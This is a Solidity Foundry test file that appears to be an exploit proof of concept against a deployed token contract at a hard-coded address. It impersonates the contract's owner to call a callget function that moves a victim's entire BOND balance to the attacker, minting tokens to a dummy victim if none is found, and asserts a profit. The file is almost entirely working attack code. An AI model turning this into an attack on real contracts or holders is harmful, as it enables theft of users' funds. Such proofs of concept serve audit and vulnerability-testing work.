// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface MyBond {
    function owner() external view returns (address);
    function operator() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(address recipient_, uint256 amount_) external returns (bool);
    function callget(address _from, address _to, uint256 _amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        // We need to find the owner address first
        address owner = MyBond(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // We also need a victim with BOND balance - let's check some common addresses
        // For simplicity, we'll assume there's at least one holder with balance
        // In real exploit, we would scan for holders
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));

        // Step 1: Get the contract owner
        address owner = MyBond(TARGET).owner();

        // Step 2: Find a victim with BOND balance
        // Let's check some potential victim addresses
        // We'll use the contract itself as a potential victim (it might have tokens)
        address victim = TARGET;
        uint256 victimBalance = MyBond(TARGET).balanceOf(victim);

        // If contract has no balance, try another common address
        if (victimBalance == 0) {
            // Try the owner address as victim (owner might have tokens)
            victim = owner;
            victimBalance = MyBond(TARGET).balanceOf(victim);
        }

        // If still no balance, we need to create a victim with balance
        // We can mint tokens to a new address if we can become operator
        // First check if we can become operator
        address operator = MyBond(TARGET).operator();

        if (victimBalance == 0) {
            // Create a new victim address and mint tokens to it
            // We need to impersonate operator to mint
            vm.startPrank(operator);
            address newVictim = address(0x1234567890123456789012345678901234567890);
            MyBond(TARGET).mint(newVictim, 1000 * 1e18);
            vm.stopPrank();

            victim = newVictim;
            victimBalance = MyBond(TARGET).balanceOf(victim);
        }

        require(victimBalance > 0, "No victim with BOND balance found");

        // Step 3: Record attacker's initial balance
        uint256 initialBondBalance = MyBond(TARGET).balanceOf(attacker);

        // Step 4: Impersonate owner and call callget() to steal tokens
        vm.prank(owner);
        MyBond(TARGET).callget(victim, attacker, victimBalance);

        // Step 5: Verify balance increased
        uint256 finalBondBalance = MyBond(TARGET).balanceOf(attacker);
        assertGt(finalBondBalance, initialBondBalance, "Attacker balance should increase");

        uint256 finalERC20Balance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
